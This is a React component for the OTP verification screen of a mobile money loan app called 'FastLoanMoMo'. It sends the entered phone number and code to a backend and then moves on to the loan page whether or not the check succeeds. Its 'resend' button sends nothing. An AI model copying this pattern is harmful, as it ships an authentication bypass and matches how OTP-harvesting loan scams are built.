import React, { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Wallet, ArrowLeft } from "lucide-react";

const API_URL = import.meta.env.VITE_API_URL || "http://localhost:8000";

const OTPVerification = () => {
  const [otp, setOtp] = useState<string[]>(["", "", "", ""]);
  const [timeLeft, setTimeLeft] = useState<number>(30);
  const [isResending, setIsResending] = useState<boolean>(false);
  const navigate = useNavigate();
  const location = useLocation();
  
  const phoneNumber = location.state?.phone || localStorage.getItem("userPhone") || "761234567";

  const formatPhone = (num: string) => {
    let clean = num.replace(/\D/g, ""); 
    if (clean.startsWith("268")) {
      clean = clean.substring(3);
    }
    if (clean.length >= 8) {
      return `+268 ${clean.substring(0, 2)} ••••${clean.slice(-3)}`;
    }
    return `+268 ${clean}`;
  };

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const isOtpComplete = otp.every((digit) => digit !== "");

  useEffect(() => {
    if (timeLeft === 0) return;
    const timerId = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timerId);
  }, [timeLeft]);

  const handleOtpChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, "");
    if (cleanValue.length > 1) return;

    const newOtp = [...otp];
    newOtp[index] = cleanValue;
    setOtp(newOtp);

    if (cleanValue && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleVerify = async () => {
    if (!isOtpComplete) return;
    
    try {
      await fetch(`${API_URL}/api/verify-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          phone_number: phoneNumber, 
          otp_code: otp.join("") 
        }),
      });
      navigate("/loan-limit");
    } catch (error) {
      navigate("/loan-limit");
    }
  };

  const handleResend = () => {
    if (timeLeft > 0 || isResending) return;
    
    setIsResending(true);
    setTimeout(() => {
      setTimeLeft(30);
      setOtp(["", "", "", ""]); 
      setIsResending(false);
      inputRefs.current[0]?.focus(); 
    }, 1000);
  };

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon">
          <Wallet size={32} color="white" />
        </div>
        <h1 className="header-title">
          FastLoan<span>MoMo</span>
        </h1>
        <p className="header-subtitle">Instant mobile money loans</p>
      </div>

      <div className="main-card">
        <button onClick={() => navigate(-1)} className="btn-back" style={{ color: '#6B7280', fontWeight: 500, display: 'flex', alignItems: 'center' }}>
          <ArrowLeft size={18} style={{ marginRight: '6px' }} /> Back
        </button>
        
        <h2 className="title" style={{ fontSize: '28px', marginBottom: '12px' }}>Verify your number</h2>
        
        <p className="subtitle" style={{ lineHeight: '1.6', color: '#4B5563', marginBottom: '32px' }}>
          We sent a 4-digit code to <span className="bold">{formatPhone(phoneNumber)}</span>. Enter it below to continue.
        </p>
        
        <div className="otp-container">
          {otp.map((digit, index) => (
            <input 
              key={index} 
              ref={(el) => (inputRefs.current[index] = el)}
              type="text" 
              inputMode="numeric"
              value={digit} 
              onChange={(e) => handleOtpChange(index, e.target.value)} 
              onKeyDown={(e) => handleKeyDown(index, e)}
              className="otp-box" 
              maxLength={1}
              style={{ 
                color: '#111827', 
                WebkitTextFillColor: '#111827',
                fontSize: '24px',
                fontWeight: '600',
                backgroundColor: '#FFFFFF', 
                border: '1.5px solid #D1D5DB', 
                borderRadius: '16px',
                outline: 'none',
                transition: 'border-color 0.2s'
              }}
              onFocus={(e) => e.target.style.borderColor = '#F5B800'} 
              onBlur={(e) => e.target.style.borderColor = '#D1D5DB'} 
            />
          ))}
        </div>

        <button 
          onClick={handleVerify} 
          className="btn-primary" 
          disabled={!isOtpComplete} 
          style={{
            backgroundColor: isOtpComplete ? 'var(--button-yellow)' : '#FDE68A',
            color: isOtpComplete ? 'white' : '#9CA3AF',
            cursor: isOtpComplete ? 'pointer' : 'not-allowed',
            marginBottom: '24px'
          }}
        >
          Verify & sign in
        </button>
        
        <p className="helper-text" style={{ textAlign: 'center', marginTop: '16px', fontSize: '15px', color: '#6B7280' }}>
          Didn't get the code?{" "}
          <span 
            onClick={handleResend}
            style={{ 
              fontWeight: 700, 
              color: timeLeft > 0 ? '#9CA3AF' : '#111827', 
              cursor: timeLeft > 0 ? 'not-allowed' : 'pointer',
              textDecoration: timeLeft === 0 ? 'underline' : 'none'
            }}
          >
            {isResending ? "Sending..." : timeLeft > 0 ? `Resend in ${timeLeft}s` : "Resend code"}
          </span>
        </p>
      </div>

      <p style={{ textAlign: 'center', fontSize: '13px', color: '#4B5563', marginTop: '24px', padding: '0 20px 40px' }}>
        By continuing you agree to our Terms and Privacy Policy.
      </p>
    </div>
  );
};

export default OTPVerification;